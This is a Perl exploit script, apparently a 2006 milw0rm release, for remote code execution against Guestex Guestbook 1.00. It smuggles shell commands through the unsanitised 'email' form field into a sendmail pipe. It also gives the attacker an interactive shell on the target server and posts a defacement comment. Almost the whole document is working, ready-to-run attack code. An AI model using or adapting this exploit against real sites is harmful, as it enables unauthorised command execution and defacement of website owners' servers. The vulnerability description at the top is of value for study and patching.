<html><head><title>Guestex Guestbook 1.00 (email) Remote Code Execution Exploit</title></head><pre>## Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
## Name: GUESTEX-exec.pl
## Date: 06/07/2006
## Version: 1.00
##  1.00 (06/07/2006) - GUESTEX-exec.pl created
## 
## Description: GUESTEX guestbook is vulnerable to remote code execution in how it 
##  handles it's 'email' parameter. $form{'email'} is used when openning a pipe to 
##  sendmail in this manner: open(MAIL, &quot;$sendmail $form{'email'}) where $form{'email'} 
##  is not properly sanitized.
##
## Usage: specify the host and location of the script as the first argument. hosts can 
##  contain ports (host:port) and you CAN specify a single command to execute via the 
##  commandline, although if you do not you will be given a shell like interface to 
##  repeatedly enter commands.
#######################################################################################
use IO::Socket;
use strict;

my $host = $ARGV[0];
my $location = $ARGV[1];
my $command = $ARGV[2];
my $sock;
my $port = 80;
my $comment = $ARGV[3] || &quot;YOUR SITE OWNS!\n&quot;;

if (!($host &amp;&amp; $location)) { 
	die(&quot;-!&gt; perl $0 &lt;host[:port]&gt; &lt;location&gt; [command] [comment]\n&quot;);
}

$port = $1  if ($host =~ m/:(\d+)/);

while (1) { 
	my $switch = 0;
	if (!($ARGV[2])) {
		print 'guestex-shell$ ';
		chomp($command = &lt;STDIN&gt;);
	}

	my $cmd = &quot;;echo --1337 start-- ;$command; echo --1337 end--&quot;;
	$cmd =~ s/(.)/sprintf(&quot;%%%x&quot;, ord($1))/ge;

	my $POST = &quot;POST $location HTTP/1.1\r\n&quot;  		             .
	           &quot;Host: $host\r\n&quot;                                         .
		   &quot;User-Agent: mozilla\r\n&quot;                                 .
	           &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;     .
		   &quot;Content-length: &quot; . length(&quot;surname=ax0r&amp;nationality=american&amp;country of residence=USA&amp;preview=no&amp;action=add&amp;name=ax0r&amp;site=ax0r net&amp;url=www.ax0r.net&amp;location=atlanta,ga&amp;rating=10&amp;comment=$comment&amp;email=ax0r\@yahoo.com$cmd&quot;) . &quot;\r\n&quot; . 
		   &quot;Referer: $host\r\n\r\n&quot;;
	
	$POST .= &quot;surname=ax0r&amp;nationality=american&amp;country of residence=USA&amp;preview=no&amp;action=add&amp;name=ax0r&amp;site=ax0r net&amp;url=www.ax0r.net&amp;location=atlanta,ga&amp;rating=10&amp;comment=$comment&amp;email=ax0r\@yahoo.com$cmd&quot;;
	
	$sock = IO::Socket::INET-&gt;new('PeerAddr' =&gt; &quot;$host&quot;,
        	                      'PeerPort' =&gt; $port,
                	              'Proto'    =&gt; 'tcp',
				      'Type'     =&gt; SOCK_STREAM) or die (&quot;-!&gt; unable to connect to '$host:$port': $!\n&quot;);

	$sock-&gt;autoflush();

	print $sock &quot;$POST&quot;;

	#$switch = 1; # used for debugging if you think 'echo' might not be working, etc
	 
	while (my $line = &lt;$sock&gt;) {
		if ($line =~ m/^\-\-1337\ start\-\-$/) {
			$switch = 1;
			next;
		}
		if ($line =~ m/^\-\-1337\ end\-\-$/) {
			close($sock);
			last;
		}
		print $line if $switch;
	}
	exit if $ARGV[2];
}

# milw0rm.com [2006-06-08]</pre></html>